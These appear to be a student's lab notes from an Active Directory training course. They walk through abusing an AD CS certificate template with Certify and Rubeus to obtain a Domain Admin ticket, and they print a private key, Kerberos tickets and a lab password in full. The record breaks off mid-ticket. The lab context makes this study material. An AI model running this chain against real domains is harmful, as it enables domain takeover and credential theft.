# Hands-On 17:

## Index Of content:

  1.[]()
  2.[]()
  
## Cerity:

```
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\AD\Tools\Certify.exe cas

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=techcorp,DC=local'


[*] Root CAs

    Cert SubjectName              : CN=TECHCORP-DC-CA, DC=techcorp, DC=local
    Cert Thumbprint               : F95C7E9F28F50C87F309A6EFB2CB3AEB0B2FAC86
    Cert Serial                   : 4F3F87A449C15587446B046111AA6313
    Cert Start Date               : 7/12/2019 12:02:05 AM
    Cert End Date                 : 7/12/2024 12:12:04 AM
    Cert Chain                    : CN=TECHCORP-DC-CA,DC=techcorp,DC=local



[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=TECHCORP-DC-CA, DC=techcorp, DC=local
    Cert Thumbprint               : F95C7E9F28F50C87F309A6EFB2CB3AEB0B2FAC86
    Cert Serial                   : 4F3F87A449C15587446B046111AA6313
    Cert Start Date               : 7/12/2019 12:02:05 AM
    Cert End Date                 : 7/12/2024 12:12:04 AM
    Cert Chain                    : CN=TECHCORP-DC-CA,DC=techcorp,DC=local


[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : TECHCORP-DC-CA
    DNS Hostname                  : Techcorp-DC.techcorp.local
    FullName                      : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=TECHCORP-DC-CA, DC=techcorp, DC=local
    Cert Thumbprint               : F95C7E9F28F50C87F309A6EFB2CB3AEB0B2FAC86
    Cert Serial                   : 4F3F87A449C15587446B046111AA6313
    Cert Start Date               : 7/12/2019 12:02:05 AM
    Cert End Date                 : 7/12/2024 12:12:04 AM
    Cert Chain                    : CN=TECHCORP-DC-CA,DC=techcorp,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
      Allow  ManageCA, ManageCertificates               TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        ForAdminsofPrivilegedAccessWorkstations
        Users
        WDAC
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator





Certify completed in 00:00:18.7932429

```

vulnerable template:

```
C:\Windows\system32>C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=techcorp,DC=local'

[*] Listing info about the Enterprise CA 'TECHCORP-DC-CA'

    Enterprise CA Name            : TECHCORP-DC-CA
    DNS Hostname                  : Techcorp-DC.techcorp.local
    FullName                      : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=TECHCORP-DC-CA, DC=techcorp, DC=local
    Cert Thumbprint               : F95C7E9F28F50C87F309A6EFB2CB3AEB0B2FAC86
    Cert Serial                   : 4F3F87A449C15587446B046111AA6313
    Cert Start Date               : 7/12/2019 12:02:05 AM
    Cert End Date                 : 7/12/2024 12:12:04 AM
    Cert Chain                    : CN=TECHCORP-DC-CA,DC=techcorp,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
      Allow  ManageCA, ManageCertificates               TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
    Enrollment Agent Restrictions : None
Enabled certificate templates where users can supply a SAN:
    CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
      Object Control Permissions
        Owner                       : TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteOwner Principals       : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteDacl Principals        : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteProperty Principals    : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519

    CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
      Object Control Permissions
        Owner                       : TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteOwner Principals       : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteDacl Principals        : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteProperty Principals    : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519

    CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : WDAC
    Schema Version                        : 4
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Code Signing
    mspki-certificate-application-policy  : Code Signing
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
      Object Control Permissions
        Owner                       : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
        WriteOwner Principals       : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteDacl Principals        : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteProperty Principals    : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519

    CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : ForAdminsofPrivilegedAccessWorkstations
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
                                      US\pawadmin                   S-1-5-21-210670787-2521448726-163245708-1138
      Object Control Permissions
        Owner                       : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
        WriteOwner Principals       : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteDacl Principals        : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
        WriteProperty Principals    : TECHCORP\Administrator        S-1-5-21-2781415573-3701854478-2406986946-500
                                      TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519



Certify completed in 00:00:10.0676431
```

pswadminn could use template:

```
CA Name                               : Techcorp-DC.techcorp.local\TECHCORP-DC-CA
    Template Name                         : ForAdminsofPrivilegedAccessWorkstations
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECHCORP\Domain Admins        S-1-5-21-2781415573-3701854478-2406986946-512
                                      TECHCORP\Enterprise Admins    S-1-5-21-2781415573-3701854478-2406986946-519
                                      US\pawadmin                   S-1-5-21-210670787-2521448726-163245708-1138
```

Request Ticket:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: E=pawadmin@techcorp.local, CN=pawadmin, CN=Users, DC=us, DC=techcorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'us.techcorp.local\pawadmin'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/us.techcorp.local
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  pawadmin
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  2/22/2023 10:55:03 AM
  EndTime                  :  2/22/2023 8:55:03 PM
  RenewTill                :  3/1/2023 10:55:03 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  EwLjopa/+morcYvEnssGiQ==
  ASREP (key)              :  0A221DBB52857307249695D6CEC2AF66


```
Copy certificate:

```
C:\Windows\system32>C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : US\studentuser17
[*] No subject name specified, using current context as subject.

[*] Template                : ForAdminsofPrivilegedAccessWorkstations
[*] Subject                 : CN=studentuser17, CN=Users, DC=us, DC=techcorp, DC=local
[*] AltName                 : Administrator

[*] Certificate Authority   : Techcorp-DC.techcorp.local\TECHCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 31

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxutCsDqyJJbHCN62RfYJuySY8z/lOeWKMbBEnQkHui0LKnv5
QtJ7ntN75i5BDuQlaQ/G02VQGtgwjsJgf8qaZVO4fPFBbUIJA2/2d+RCZFPXMWMY
P7Em4GUGNOX83XF/6o5CJiTybcLLyq6XxS5FN93Q4YETzXsSdoByuR4SMC7GS/Ab
efPxef0rFlQMTuyCqk11O9CiHbFTZe6kfDRMPn1D8tZkvDtzq/JzyGhtIwbK/hKx
BPREmwbZ+brbIBZUFvyLj5hqvgXW4bIzXMcoUxLAKBjhA7xFr7IxJnqwClI/wAgF
j6LvCuMFCbm1DNZ3aykLZ75ZGlvHKgQYgkGGaQIDAQABAoIBAH6M4ap4TSlV+147
Qj8UHnC/AcePmOfSjq6584zsV8wsJ/RpVtUaT6dl6GcyehVdNCe478dBp0rMy2en
ZfknDj70mmRyoCtAXbegHW98+ngVlsxGvQCYVaFg5Cf3QX4oXTb+NjtKOil2Smyx
0sCRhVvbdK5ijhSl/cMCSPpYlT2tBEWxRjdMBw1K8vkz3Wz4wNmuWNd3h+tW0nIt
gqrwP0zsj3Hn0HLbhTSZEEw4cUh9ZSbUSEVQrvbZnkz599ZD8yfA3Q7NZfjWWVn6
tZeVtbWohuVJHfzWx1lzpgiq8BTA8SSTyfnvYc3Pf3Zj9s4EFreUzCWWjyl4xwCO
4Sw9LNkCgYEA9PSC1/XAIoYX2V/BFnB7ZnlE7bQBNrQg1TSjbucSQPSTJdvA0t6T
uYtNReHErydcw4TwX0/YFQl+Z7E6g1FbGvYST1x1MMRT4YubD9NQRXKRx22ypvna
vljCFa1JkgC9EQYXPK1whQlJ4pGpf0kPthY/RbLrP1BRbb04ItF2hM8CgYEAz+Nc
DD2qNaEnTDX5LMFQDbkcwFOOiT9N+Ur4rtHW463AVsJelYuy81bMUn/jhvaTfEQv
uNyI/ybKybNSqzxt7KnGXEbq9HtR/Uqrbx5DyAyWXB+GS0rM4oqUy/u/C1loi6n1
aSzmV2g2s/ytjtGr+vzxUFg0drxl1P1n9BmAf0cCgYAwH1URLjNX1PYce0ZIrUJg
6FQVSrauU4bbu+KbqAObBTFfT6O7CYUF/4rnvqnQKzB7LMO4RcxSnbHalyPCppn6
WvtP4f8X3IoKFk4ZNs9fRVnETxW43f8ORAulDI0WhNSf4o1wGzauvBtqymj9G5Jd
mFNH0xWKM7I7l9/OX04kWwKBgQDKBEEAzDPJZc9Qaeq4KSroCwj7hLcwfEoDhW1g
RR4zpjcQmFVdsaG2gpSPXyP1lUwBKCnP1M90U3ggxZgCOvj/UIQoS+oqpmQoZhVu
J9TqZAEBiMjyBcBQLScnin4+QyYrAoAvMqisK+NsyJDIBsy/XGoMD4r8D1xNu+r2
9IlAJQKBgDZDojCANv9X2FNWng+xVH3OpPgb8i/ZjS0CcWwOXCotQFnpyBqYUc/G
83sI3aGCuLGdRhS3a3cVG84qZlw0H2f1/pPwtjkRTew0VnQkwESXwGMeATavvFqc
WOZia5h1ZU6Ahg+3EU3iUdRri+ZuNKWUYnHUjnSUeoP40b8KGpyZ
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGSDCCBTCgAwIBAgITdwAAAB+fr/pbNwgGNAAAAAAAHzANBgkqhkiG9w0BAQsF
ADBKMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGDAWBgoJkiaJk/IsZAEZFgh0ZWNo
Y29ycDEXMBUGA1UEAxMOVEVDSENPUlAtREMtQ0EwHhcNMjMwMjIyMTg0NzAyWhcN
MjQwMjIyMTg0NzAyWjBtMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGDAWBgoJkiaJ
k/IsZAEZFgh0ZWNoY29ycDESMBAGCgmSJomT8ixkARkWAnVzMQ4wDAYDVQQDEwVV
c2VyczEWMBQGA1UEAxMNc3R1ZGVudHVzZXIxNzCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAMbrQrA6siSWxwjetkX2CbskmPM/5TnlijGwRJ0JB7otCyp7
+ULSe57Te+YuQQ7kJWkPxtNlUBrYMI7CYH/KmmVTuHzxQW1CCQNv9nfkQmRT1zFj
GD+xJuBlBjTl/N1xf+qOQiYk8m3Cy8qul8UuRTfd0OGBE817EnaAcrkeEjAuxkvw
G3nz8Xn9KxZUDE7sgqpNdTvQoh2xU2XupHw0TD59Q/LWZLw7c6vyc8hobSMGyv4S
sQT0RJsG2fm62yAWVBb8i4+Yar4F1uGyM1zHKFMSwCgY4QO8Ra+yMSZ6sApSP8AI
BY+i7wrjBQm5tQzWd2spC2e+WRpbxyoEGIJBhmkCAwEAAaOCAwIwggL+MD4GCSsG
AQQBgjcVBwQxMC8GJysGAQQBgjcVCIW5wzuGgYcDg5WPEIKezyOD0cIbgQCE3O12
ho3hJQIBZAIBCzApBgNVHSUEIjAgBggrBgEFBQcDAgYIKwYBBQUHAwQGCisGAQQB
gjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQoMCYwCgYIKwYBBQUH
AwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG9w0BCQ8ENzA1MA4G
CCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcN
AwcwHQYDVR0OBBYEFL/l7ilgfrYBIeJ0IaeZZkeQ3PdkMCgGA1UdEQQhMB+gHQYK
KwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1UdIwQYMBaAFM4YvtTaG9ov
MSEIc+2cFhORAO+RMIHTBgNVHR8EgcswgcgwgcWggcKggb+GgbxsZGFwOi8vL0NO
PVRFQ0hDT1JQLURDLUNBLENOPVRlY2hjb3JwLURDLENOPUNEUCxDTj1QdWJsaWMl
MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
PXRlY2hjb3JwLERDPWxvY2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBwwYIKwYBBQUHAQEE
gbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1URUNIQ09SUC1EQy1DQSxD
Tj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049
Q29uZmlndXJhdGlvbixEQz10ZWNoY29ycCxEQz1sb2NhbD9jQUNlcnRpZmljYXRl
P2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG
9w0BAQsFAAOCAQEAjGAYyoDElXai7mS8vHIO85Yu3AAkP941LeC8TvX6Nk5RAI2p
S6M6YMnI1Y280cVfRzI+wryy8HZfzbh1iSTkSfsa9MfrbnxvylY2y5DoH47t/L/a
VigSttYgx/xqRu85JE4+qpq9wspDmIsYgGwOq8HxLGLYQKx6X7bvENc3l5z0+N/F
gYTRfBaqyizY7fnyhQREXR9w+GfWJcCo10qT9VgWsCp9k0QKzsyIFOOyDGzbxnmA
4sJeFl6Piq1TPtlso305D9LYvSbxEOqwv7apI+fdX68F3I4WMBrKgWIa2QwOroah
iv/4Ra5WLy5XeyEHNHs1CbDCnmXqGKi4ll1Ngw==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:18.0310140
```

Use DA and ingect TGT:

```
C:\Windows\system32>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\certificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\DA.pfx
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Enter Export Password:
Verifying - Enter Export Password:

C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\DA.pfx /password:SecretPass@123 /nowrap /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=studentuser17, CN=Users, DC=us, DC=techcorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'us.techcorp.local\Administrator'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGgjCCBn6gAwIBBaEDAgEWooIFgzCCBX9hggV7MIIFd6ADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxF1cy50ZWNoY29ycC5sb2NhbKOCBTEwggUtoAMCARKhAwIBAqKCBR8EggUbM+ejgPfMA4p22w2ddObZa9MvxmxaBRM/lIFsgkI9vNEeAIHLIFyaYhIkH0jpz+9+H1y9O/dUN6XmhoWEyryEXIY47vZfS03CDpqkiOjkEeHs2OQi/DVWshWQuho7gmenUkxwbsBRDuwAR5V0KaoZgmb1uaPH/0vqSaY7hG2T/7dQptP3bhwM7Ngs7w7innOKw90peyfNw0s7bQSbiJo/nPcEFm18QwjTEWv8ooaxgtRFJXwa0raL3xcmZsBVoEYNU0LxZiJjz9qXAUdAr6K5XUteZOSHP/jc6IVnoG5og2Li/K3+LOTeNc2E3kEiIuWKzB7+D1eHy0EzP2V1PYXrI5HOhuQ5/IElT0QEm3gDQVsmNw4+lC5IR5JMdneSbtXh5aFz2tdJjKd9YDJRheESyEqfDJPhl2Q27F2Hgze6a+OiXPAjvyga2jGVGcTD4eLCL6VU+VknNuD0WljLiaWjfBI9UEtACpV4MjhkFlDZrAnCiEO+95FOy5vPcg8avqe4+NM7XiZm/aOaMtcBLBRItrp1Br7yGk6DI7C8dpNJFsmkp4gWZEAUJqzBK4FQnXz8HFSH3vkpJ+3pYDokwAhtC+eh2yIMQNb4IrPCnL811GoqnpRVdUhx1+lpy609g8L/OWMqlSVN9EL3WgG0zBhkEoxPUzZlXvo7QbnngRSkFgbD8GoJwBGXvs535aGw4VPDtoBn4RVu4yrgCddGYG/ywcRvTCBTb32E8cl55eBhrI8pGlUodzw57K9z3oM37mI7BEbP5O3WU3WVZraMcwH8/CwtUukGqJ7I69U0DeLAficusn3DOWz4tLWe3WasJGc6f6cqUGo0KPB5B7XvATr/KMIR3qAUaZepUe2tF9wyAV2Mwm34ppxbVFoOLPRAlmc8EXJWriRnj6NDugVNZ/P94W8/QQWSZXHpwHs0JOmkQytsgSMO+1ltKruigliHvz9vd4ta+AmFB2qG89SCRP3vOtOC+GbPbmyqgFnhG7zrnvaH8ItP8dSUZmvJgUaiP1tYEnNI1nkHpYUQ3024pErHmnLJ99kMGfl9h83faQC9kL84X/wofUuAb+y8CVrMX8YYta3PZ3we/rxi1pDYRGFgoyJxUNTj3aSBOQWydMFzwweT+5vXTvvMpOlGyjXFTu7sQyurlZbIZsUgI0QkkPYfFXQA+cRtvE2FC8xhp0vC47hRNYNvmxUNSzbPHTz9a0G4OxgPy8fEUBbBK0ZBQO/CZVTLD5MBNDEH+jsjJGs0dehD1nypgVBvTqvT1IX6J+eawNY/dqggPvccTqoGSOPb5Xce/Gs3r+rVs4xBxdBYTer9oH1Ojmx0g9M6fZh/CpX/zr9CALGFY0SB9Omgy5L8bXn2Pn9JA4FEeScZndsdL10tUkx05yPmfiyOmV